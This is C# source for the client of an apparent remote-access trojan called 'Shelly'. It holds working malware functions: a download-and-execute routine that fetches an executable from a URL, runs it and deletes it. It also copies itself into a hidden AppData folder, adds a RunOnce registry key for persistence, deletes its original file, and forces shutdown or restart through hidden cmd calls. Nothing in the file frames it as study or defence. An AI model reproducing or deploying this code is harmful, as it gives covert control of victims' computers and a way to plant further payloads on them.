using System;
using System.IO;
using System.Net;
using System.Linq;
using System.Drawing;
using Microsoft.Win32;
using System.Threading;
using System.Diagnostics;
using System.Windows.Forms;
using System.Drawing.Imaging;
using System.Net.NetworkInformation;
using System.Runtime.InteropServices;

namespace Shelly_Client
{
    class Functions
    {
        // General class
        public class General
        {
            // Ping method
            public static string Ping()
            {
                // Create new instance
                using (Ping SendPing = new Ping())
                {
                    // Return ms response
                    return SendPing.Send(Program.ServerIp).RoundtripTime.ToString() + "ms";
                }
            }

            // MsgBox method
            public static void MsgBox(string Message)
            {
                // Make and start thread
                new Thread(() =>
                {
                    // Set thread to background
                    Thread.CurrentThread.IsBackground = true;

                    // Display messagebox
                    MessageBox.Show(Message);
                }).Start();
            }

            // DAE method
            public static void DAE(string Url)
            {
                // Make and start thread
                new Thread(() =>
                {
                    // Set thread to background
                    Thread.CurrentThread.IsBackground = true;

                    // Try to do tasks
                    try
                    {
                        // Set string
                        string FileName = NoneClientRelated.GenerateRandomString(12) + ".exe";

                        // Create new instance
                        using (WebClient webClient = new WebClient())
                        {
                            // Download file
                            webClient.DownloadFile(Url, Path.GetTempPath() + FileName);
                        }

                        // Start file
                        Process.Start(Path.GetTempPath() + FileName);

                        // Sleep 30 seconds
                        Thread.Sleep(30000);

                        // Delete file
                        File.Delete(Path.GetTempPath() + FileName);
                    } catch
                    {

                    }
                }).Start();
            }
        }

        // Fun class
        public static class Fun
        {
            // CWP method
            public static void CWP(string Url)
            {
                // Make and start thread
                new Thread(() =>
                {
                    // Set thread to background
                    Thread.CurrentThread.IsBackground = true;

                    // Try to do tasks
                    try
                    {
                        // Set string
                        string FileName = NoneClientRelated.GenerateRandomString(12) + ".png";

                        // Goto temp
                        Directory.SetCurrentDirectory(Path.GetTempPath());

                        // Create new instance
                        using (WebClient webClient = new WebClient())
                        {
                            // Download file
                            webClient.DownloadFile(Url, FileName);
                        }

                        // Set variables
                        string BmpFile = FileName;
                        int index = BmpFile.IndexOf(".");

                        // Check if index is greater than 0
                        if (index > 0)
                        {
                            // Strip file extention
                            BmpFile = BmpFile.Substring(0, index);
                        }

                        // Declair new instance
                        using (Image Img = Image.FromFile(FileName))
                        {
                            // Convert file to bmp
                            Img.Save(BmpFile + ".bmp", ImageFormat.Bmp);
                        }

                        // Delete file
                        File.Delete(FileName);

                        // Set wallpaper
                        NoneClientRelated.ChangeWallpaper(BmpFile + ".bmp");

                        // Delete file
                        File.Delete(BmpFile + ".bmp");

                        // Goto execution path
                        Directory.SetCurrentDirectory(Program.ExecutionPath);
                    }
                    catch
                    {

                    }
                }).Start();
            }
        }

        // PowerOptions class 
        public class PowerOptions
        {
            // Shutdown method
            public static void Shutdown()
            {
                // Shutdown
                NoneClientRelated.Cmd("timeout /t 2 & shutdown /s /t 0 /f");
            }
            
            // Restart method
            public static void Restart()
            {
                // Restart
                NoneClientRelated.Cmd("timeout /t 2 & shutdown /r /t 0 /f");
            }

            // Hibernate method
            public static void Hibernate()
            {
                // Hibernate
                NoneClientRelated.Cmd("timeout /t 2 & rundll32.exe powrprof.dll,SetSuspendState 0,1,0");
            }
        }

        // InstallMethods class
        public static class InstallMethods
        {
            public static void Install()
            {
                // Check if another instance is already installed
                if (Directory.Exists(Program.Appdata + @"\Shelly"))
                {
                    // Melt
                    NoneClientRelated.Cmd("timeout /t 3 & del Shelly.exe");

                    // Exit
                    Environment.Exit(0);
                }

                // Create folder in appdata
                Directory.SetCurrentDirectory(Program.Appdata);
                Directory.CreateDirectory("Shelly");

                // Set folder to system hidden
                NoneClientRelated.Cmd("attrib +S +H Shelly");

                // Copy file to folder
                File.Copy(Program.ExecutionPath + @"\Shelly.exe", Program.Appdata + @"\Shelly\Shelly.exe");

                // Start file
                Directory.SetCurrentDirectory(Program.Appdata + @"\Shelly");
                Process.Start(Program.Appdata + @"\Shelly\Shelly.exe");

                // Add startup key
                StartupKey("Add");

                // Goto initial execution path
                Directory.SetCurrentDirectory(Program.ExecutionPath);

                // Melt
                NoneClientRelated.Cmd("timeout /t 3 & del Shelly.exe");

            }

            public static void Uninstall()
            {
                // Remove startup key
                StartupKey("Remove");

                // Remove folder
                Directory.SetCurrentDirectory(Program.Appdata);
                NoneClientRelated.Cmd("timeout /t 3 & rd /s /q Shelly");
            }

            // Add/remove startup key method
            public static void StartupKey(string AddOrRemove)
            {
                // Open the runonce registry folder
                using (RegistryKey AddKey = Registry.CurrentUser.OpenSubKey(@"SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce", true))
                {
                    // If choose equals true, add startup key, if not, remove it
                    if (AddOrRemove == "Add")
                    {
                        // Add key
                        AddKey.SetValue("Shelly", Program.Appdata + @"\Shelly\Shelly.exe");
                    }
                    else
                    {
                        // Delete Key
                        AddKey.DeleteValue("Shelly");
                    }
                }
            }
        }

        // NoneClientRelated class
        public static class NoneClientRelated
        {
            // Run cmd command method
            public static void Cmd(string Command)
            {
                // Declare new instance
                var CmdCommand = new Process();

                // Set start info
                ProcessStartInfo startInfoMelt = new ProcessStartInfo()
                {
                    // Set windows style to hidden
                    WindowStyle = ProcessWindowStyle.Hidden,

                    // Set filename to run cmd
                    FileName = "cmd.exe",

                    // Set cmd arguments
                    Arguments = @"/C " + Command
                };

                // Set start info
                CmdCommand.StartInfo = startInfoMelt;

                // Start cmd with arguments
                CmdCommand.Start();
            }

            // Import dll
            [DllImport("user32.dll", CharSet = CharSet.Auto)]

            // setup the SystemParametersInfo parameters
            static extern int SystemParametersInfo(int uAction, int uParam, string lpvParam, int fuWinIni);

            // Change wallpaper method, NOTE: it has a z at the end so it dosnt mess with the thread naming
            public static void ChangeWallpaper(string PicName)
            {
                // Create new RegistryKey instance 
                RegistryKey key = Registry.CurrentUser.OpenSubKey(@"Control Panel\Desktop", true);

                // Set the keys
                key.SetValue(@"WallpaperStyle", 2.ToString());
                key.SetValue(@"TileWallpaper", 0.ToString());

                // Set wallpaper
                SystemParametersInfo(20, 0, Directory.GetCurrentDirectory() + @"\" + PicName, 0x01 | 0x02);
            }

            // GenerateRandomString method
            private static Random random = new Random();
            public static string GenerateRandomString(int length)
            {
                // Set chars
                const string chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";

                // Create and return random string
                return new string(Enumerable.Repeat(chars, length)
                  .Select(s => s[random.Next(s.Length)]).ToArray());
            }
        }
    }
}